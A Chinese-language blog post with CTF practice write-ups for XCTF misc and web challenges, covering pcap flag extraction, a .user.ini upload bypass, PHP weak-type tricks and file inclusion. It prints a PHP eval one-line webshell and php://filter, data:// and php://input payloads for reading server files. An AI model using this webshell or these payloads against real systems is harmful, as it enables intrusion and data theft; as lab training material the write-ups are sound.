<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="xctfÂà∑È¢ò ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏Ôºàmisc) ‰ΩøÁî® linux strings ÂëΩ‰ª§Êü•Áúã ÂØπ{ËøõË°åÂåπÈÖç strings webshell.pcapng | grep {\nÂæóÂà∞flag\nÊàñËÄÖ\nwiresharkËøáÊª§http contains &ldquo;shell&rdquo;\nÊü•ÁúãËøáÊª§Âá∫Êù•ÁöÑÂåÖ\nÊúÄÂêéÂ∞±ÊòØflag\nÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢Ôºàmisc) stegsolveÂèëÁé∞‰∫åÁª¥Á†ÅÊâ´Âá∫‰∏Ä‰∏≤16ËøõÂà∂\n">
<title>xctfÂà∑È¢ò</title>

<link rel='canonical' href='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="xctfÂà∑È¢ò">
<meta property='og:description' content="xctfÂà∑È¢ò ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏Ôºàmisc) ‰ΩøÁî® linux strings ÂëΩ‰ª§Êü•Áúã ÂØπ{ËøõË°åÂåπÈÖç strings webshell.pcapng | grep {\nÂæóÂà∞flag\nÊàñËÄÖ\nwiresharkËøáÊª§http contains &ldquo;shell&rdquo;\nÊü•ÁúãËøáÊª§Âá∫Êù•ÁöÑÂåÖ\nÊúÄÂêéÂ∞±ÊòØflag\nÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢Ôºàmisc) stegsolveÂèëÁé∞‰∫åÁª¥Á†ÅÊâ´Âá∫‰∏Ä‰∏≤16ËøõÂà∂\n">
<meta property='og:url' content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/'>
<meta property='og:site_name' content='ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Âà∑È¢ò' /><meta property='article:published_time' content='2025-01-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/1.webp' />
<meta name="twitter:title" content="xctfÂà∑È¢ò">
<meta name="twitter:description" content="xctfÂà∑È¢ò ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏Ôºàmisc) ‰ΩøÁî® linux strings ÂëΩ‰ª§Êü•Áúã ÂØπ{ËøõË°åÂåπÈÖç strings webshell.pcapng | grep {\nÂæóÂà∞flag\nÊàñËÄÖ\nwiresharkËøáÊª§http contains &ldquo;shell&rdquo;\nÊü•ÁúãËøáÊª§Âá∫Êù•ÁöÑÂåÖ\nÊúÄÂêéÂ∞±ÊòØflag\nÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢Ôºàmisc) stegsolveÂèëÁé∞‰∫åÁª¥Á†ÅÊâ´Âá∫‰∏Ä‰∏≤16ËøõÂà∂\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/1.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üòã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô</a></h1>
            <h2 class="site-description">CialloÔΩû(‚à†„Éªœâ&lt; )‚åí‚òÖ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏misc">ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏Ôºàmisc)</a></li>
    <li><a href="#ÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢misc">ÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢Ôºàmisc)</a></li>
    <li><a href="#back--upweb">back  up(web)</a></li>
    <li><a href="#simple_phpweb">simple_php(web)</a></li>
    <li><a href="#easyuploadweb">easyuploadÔºàwebÔºâ</a></li>
    <li><a href="#fileincludeweb">fileinclude(web)</a></li>
    <li><a href="#filecludeweb">fileclude(web)</a></li>
    <li><a href="#easyphpweb">easyphp(web)</a></li>
    <li><a href="#file_includeweb">file_include(web)</a>
      <ol>
        <li><a href="#php‰º™ÂçèËÆÆËØªÊñá‰ª∂ÁöÑÂÖ∂‰ªñÊñπÂºè">php://‰º™ÂçèËÆÆËØªÊñá‰ª∂ÁöÑÂÖ∂‰ªñÊñπÂºè</a></li>
      </ol>
    </li>
    <li><a href="#unsepingweb">unseping(web)</a></li>
    <li><a href="#web_python_template_injectionweb">Web_python_template_injection(web)</a>
      <ol>
        <li><a href="#ssti">SSTI</a></li>
        <li><a href="#ÂÆòÊñπwp">ÂÆòÊñπWP</a></li>
      </ol>
    </li>
    <li><a href="#web_php_unserializeweb">Web_php_unserialize(web)</a></li>
    <li><a href="#php_rce">php_rce</a></li>
    <li><a href="#web_php_include">Web_php_include</a></li>
    <li><a href="#catcat-new">catcat-new</a></li>
    <li><a href="#mfw">mfw</a></li>
    <li><a href="#ics-05">ics-05</a></li>
    <li><a href="#easytornado">easytornado</a></li>
    <li><a href="#shrine">shrine</a></li>
    <li><a href="#fakebook">fakebook</a></li>
    <li><a href="#very_easy_sql">very_easy_sql</a></li>
    <li><a href="#can_has_stdiomisc">can_has_stdio?Ôºàmisc)</a></li>
    <li><a href="#glance-50misc">glance-50(misc)</a></li>
    <li><a href="#miss_01misc">miss_01(misc)</a></li>
    <li><a href="#wire1misc">Wire1(misc)</a></li>
    <li><a href="#catweb">Cat(web)</a></li>
    <li><a href="#flatscience">FlatScience</a></li>
    <li><a href="#wife_wife">wife_wife</a></li>
    <li><a href="#confusion1">Confusion1</a></li>
    <li><a href="#ezbypass-cat">ezbypass-cat</a></li>
    <li><a href="#ez_curl">ez_curl</a></li>
    <li><a href="#bug">bug</a></li>
    <li><a href="#wzsc_Êñá‰ª∂‰∏ä‰º†">wzsc_Êñá‰ª∂‰∏ä‰º†</a></li>
    <li><a href="#È¢òÁõÆÂêçÁß∞-warmup">È¢òÁõÆÂêçÁß∞-warmup</a></li>
    <li><a href="#badprogrammer">BadProgrammer</a></li>
    <li><a href="#i-got-id-200">i-got-id-200</a></li>
    <li><a href="#wtfsh-150">wtf.sh-150</a></li>
    <li><a href="#web_php_wrong_nginx_config">Web_php_wrong_nginx_config</a></li>
    <li><a href="#zhuanxv">Zhuanxv</a></li>
    <li><a href="#filemanager">filemanager</a></li>
    <li><a href="#comment">comment</a></li>
    <li><a href="#upload">upload</a></li>
    <li><a href="#smarty">smarty</a></li>
    <li><a href="#ics-02">ics-02</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/xctf%E5%88%B7%E9%A2%98/">
                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.webp"
                        
                        width="5416" 
                        height="2894" 
                        loading="lazy"
                        alt="Featured image of post xctfÂà∑È¢ò" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
                Âà∑È¢ò&amp;&amp;ÊâìÈù∂
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/xctf%E5%88%B7%E9%A2%98/">xctfÂà∑È¢ò</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 11, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 45 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="xctfÂà∑È¢ò">xctfÂà∑È¢ò
</h1><h2 id="ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏misc">ÂøÉ‰ª™ÁöÑÂÖ¨Âè∏Ôºàmisc)
</h2><p>‰ΩøÁî® linux strings ÂëΩ‰ª§Êü•Áúã
ÂØπ{ËøõË°åÂåπÈÖç
strings webshell.pcapng | grep {</p>
<p>ÂæóÂà∞flag</p>
<p>ÊàñËÄÖ</p>
<p>wiresharkËøáÊª§http contains &ldquo;shell&rdquo;</p>
<p>Êü•ÁúãËøáÊª§Âá∫Êù•ÁöÑÂåÖ</p>
<p>ÊúÄÂêéÂ∞±ÊòØflag</p>
<h2 id="ÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢misc">ÈÄÇÂêà‰Ωú‰∏∫Ê°åÈù¢Ôºàmisc)
</h2><p>stegsolveÂèëÁé∞‰∫åÁª¥Á†ÅÊâ´Âá∫‰∏Ä‰∏≤16ËøõÂà∂</p>
<p>‰∏¢Ëøõ010ÔºåÊòØpycÊñá‰ª∂ÔºåÂêéÁºÄ‰øÆÊîπ‰∏∫.pyc</p>
<p>Easy Python DecompilerÂØπÊñá‰ª∂ËøõË°åÂèçÁºñËØë„ÄÇÂèçÁºñËØëÂêéÁî®vimÊü•ÁúãÊ∫êÁ†Å</p>
<p>‰∏Ä‰∏≤ÂáΩÊï∞Ê≤°Ë¢´Ë∞ÉÁî®ÔºåÁõ¥Êé•Ë°•‰∏äflag()</p>
<h2 id="back--upweb">back  up(web)
</h2><p>Â§á‰ªΩÊñá‰ª∂Êü•ÁúãÁöÑÂêéÁºÄ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚Äú.git‚Äù „ÄÅ‚Äú.svn‚Äù„ÄÅ‚Äú .swp‚Äù‚Äú.~‚Äù„ÄÅ‚Äú.bak‚Äù„ÄÅ‚Äú.bash_history‚Äù„ÄÅ‚Äú.bkf‚Äù 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈ¢ò.bak‰∏ãËΩΩÊñá‰ª∂Áî®ËÆ∞‰∫ãÊú¨ÊâìÂºÄÁúãÂà∞flag</p>
<h2 id="simple_phpweb">simple_php(web)
</h2><p>phpÂº±Á±ªÂûãÊØîËæÉ</p>
<p>a‰∏é0ÊØîËæÉÂâç‰ºöËΩ¨ÊàêÁõ∏ÂêåÁöÑÊï∞ÊçÆÁ±ªÂûãÊâÄ‰ª•aÂèØ‰ª•ÊòØ‰ªªÊÑèÂ≠óÁ¨¶‰∏≤ÁªìÊûú‰∏∫0Ôºõ</p>
<p>b‰∏çËÉΩÊòØÊï∞Â≠ó‰ΩÜÊòØË¶ÅÂ§ß‰∫é1234ÔºåÊàë‰ª¨Áõ¥Êé•ÊääÂ§ß‰∫é1234ÁöÑÊï∞‰∏é‰ªªÊÑèÂ≠óÁ¨¶‰∏≤ÊãºÊé•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608.png"
	width="1279"
	height="661"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608_hu12049528235250110247.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608_hu13685509414097722706.png 1024w"
	loading="lazy"
	
		alt="image-20250111174740608"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<h2 id="easyuploadweb">easyuploadÔºàwebÔºâ
</h2><p>ËøôÈ¢òÂ∞ùËØï‰∫ÜÂæàÂ§öÂäûÊ≥ï</p>
<p>ÊúÄÂêéÁî®.user.iniÁöÑÊñπÂºè‰∏ä‰º†ÊàêÂäü</p>
<p>ÂÖà‰∏ä‰º†.user.ini</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.user.ini ÈÖçÁΩÆÈ°π‰∏≠Êúâ‰∏§‰∏™ÈÖçÁΩÆÂèØ‰ª•Ëµ∑Âà∞‰∏Ä‰∫õ‰ΩúÁî®
</span></span><span class="line"><span class="cl">ÊñπÊ≥ï‰∏ÄÔºö
</span></span><span class="line"><span class="cl">auto_prepend_file = &lt;filename&gt;         //ÂåÖÂê´Âú®Êñá‰ª∂Â§¥
</span></span><span class="line"><span class="cl">ÊñπÊ≥ï‰∫åÔºö
</span></span><span class="line"><span class="cl">auto_append_file = &lt;filename&gt;          //ÂåÖÂê´Âú®Êñá‰ª∂Â∞æ
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êñá‰ª∂ÂêçÊàë‰ª¨ÂÜôshell.jpg</p>
<p>ÁÑ∂ÂêébpÊîπÂåÖ</p>
<p>Ê≥®ÊÑèË¶ÅÂú®ËøôÈáå</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060.png"
	width="639"
	height="105"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060_hu5642512607850009542.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060_hu8188563888349475600.png 1024w"
	loading="lazy"
	
		alt="image-20250111193921060"
	
	
		class="gallery-image" 
		data-flex-grow="608"
		data-flex-basis="1460px"
	
></p>
<p>Êñá‰ª∂Â§¥Âä†‰∏äGIF89aÊâç‰ºö‰∏ä‰º†ÊàêÂäü</p>
<p>ÁÑ∂ÂêéÂ∞±ÊòØshell.jpgÈáåÈù¢ÁöÑÊú®È©¨ÊúÄÁ®≥ÂÆöÁöÑÊòØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=eval($_POST[&#39;cmd&#39;]);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ä‰º†ÊàêÂäüÂêéÂà©Áî®Âà∞ÁâπÊÄß<code>user.ini</code>Âíå<code>shell.jpg</code>Âêå‰∏ÄÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâphpÊñá‰ª∂ÈÉΩ‰ºöÂåÖÂê´<code>shell.jpg</code>Êñá‰ª∂</p>
<p>ËöÅÂâëËøûÊé•index.phpÔºåÂØÜÁ†Å‰∏∫cmdÂç≥ÂèØ</p>
<h2 id="fileincludeweb">fileinclude(web)
</h2><p>Êü•ÁúãÊ∫êÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996.png"
	width="685"
	height="486"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996_hu4795921870539599483.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996_hu6458834748485662527.png 1024w"
	loading="lazy"
	
		alt="image-20250111200423996"
	
	
		class="gallery-image" 
		data-flex-grow="140"
		data-flex-basis="338px"
	
></p>
<p>Â§ßÊ¶ÇÊÑèÊÄùÂ∞±ÊòØÂú®cookieÁöÑ‰ΩçÁΩÆÁªôlanguageÂ°´ÂÄº‰ºö‰º†ÁªôÂèòÈáèlanËÆ©index.phpÂåÖÂê´‰∏älan.phpÁöÑ‰∏úË•ø</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047.png"
	width="1915"
	height="525"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047_hu11996669394772244791.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047_hu16514559682098325715.png 1024w"
	loading="lazy"
	
		alt="image-20250111201325047"
	
	
		class="gallery-image" 
		data-flex-grow="364"
		data-flex-basis="875px"
	
></p>
<p>Áî±‰∫éÊ∫êÁ†Å‰∏≠‰ºöÂä†.phpÊâÄ‰ª•Êàë‰ª¨Âè™‰º†ÂÄº‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊîæË°åÂ∞±ÂæóÂà∞ÁºñÁ†ÅÂêéÁöÑflag</p>
<h2 id="filecludeweb">fileclude(web)
</h2><p>file1ÂæàÂ•ΩÂà©Áî®Ë∑ü‰∏äÈù¢‰∏ÄÊ†∑base64ÁºñÁ†Åflag.phpÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file1=php://filter/read=convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>file2Ë¶ÅÂÜÖÂÆπÂåÖÂê´hello ctf</p>
<p>Á¨¨‰∏ÄÁßçÂäûÊ≥ïÂú®dataÊï∞ÊçÆÊµÅ‰∏≠Âä†ÂÖ•hello ctf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file2=data://text/plain,hello ctf
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∫åÁßçÁî®php://input</p>
<p>ÁÑ∂ÂêéÂú®postÈáåÈù¢‰º†hello ctf</p>
<p>hackbarË¶Å‰º†ÈîÆÂÄºÂØπÁöÑÂΩ¢Âºè hello ctf=hello ctf</p>
<p>ÁÑ∂ÂêébpÊäìÂåÖÊääÈîÆÂà†ÊéâÊîæË°å</p>
<p>base64Ëß£Á†ÅÂá∫flag</p>
<h2 id="easyphpweb">easyphp(web)
</h2><p>‰ª£Á†ÅÂÆ°ËÆ°</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550.png"
	width="913"
	height="315"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550_hu5848579455175082551.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550_hu15066743949140273861.png 1024w"
	loading="lazy"
	
		alt="image-20250111211646550"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="695px"
	
></p>
<p>intvalÂáΩÊï∞ËøîÂõûÊï¥ÂûãÁöÑÂÄº</p>
<p>Êàë‰ª¨Áî®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÂ∞±ÁªïËøá‰∫Ü1e9|1e8|1e7ÈÉΩË°å</p>
<p>ÁÑ∂ÂêébË∑ëËÑöÊú¨</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749.png"
	width="1734"
	height="962"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749_hu13576408585323507237.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749_hu6443324753388567888.png 1024w"
	loading="lazy"
	
		alt="image-20250111212655749"
	
	
		class="gallery-image" 
		data-flex-grow="180"
		data-flex-basis="432px"
	
></p>
<p>ÂæóÂá∫53724</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332.png"
	width="880"
	height="285"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332_hu6712889165123142695.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332_hu7179563555160957518.png 1024w"
	loading="lazy"
	
		alt="image-20250111213143332"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="741px"
	
></p>
<p>ÁÑ∂ÂêécÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåÊúÄÂêéË¶Å‰∏∫jsonÊ†ºÂºèÔºåc‰∏≠m‰∏çÊòØÊï∞Â≠ó‰ΩÜË¶Å&gt;2022,Áî®ÂâçÈù¢Â≠¶Âà∞ÁöÑÊï∞Â≠óÊãºÊé•Â≠óÁ¨¶‰∏≤ÁªïËøá2023a</p>
<p>c‰∏≠ÁöÑnÈïøÂ∫¶‰∏∫2Ôºå‰∏î‰∏∫‰∫åÁª¥Êï∞ÁªÑÔºåÂ∞±ÊòØ[[..],..]ÁöÑÂΩ¢Âºè</p>
<p>Ë¶ÅÁªïËøáÁöÑÊòØarray_searchÂáΩÊï∞</p>
<p>c[n]‰∏≠ÂøÖÈ°ªÊúâDGGJ,ÂêéÈù¢ÂØπÊï∞ÁªÑÂÄºÂà§Êñ≠ÊúâDGGJÂ∞±ÁªàÊ≠¢</p>
<p>‰∏äÈù¢Ë∑üÂ≠óÁ¨¶‰∏≤ÊØîËæÉÊï∞Â≠ó‰∏ÄÊ†∑ÁöÑÂéüÁêÜ</p>
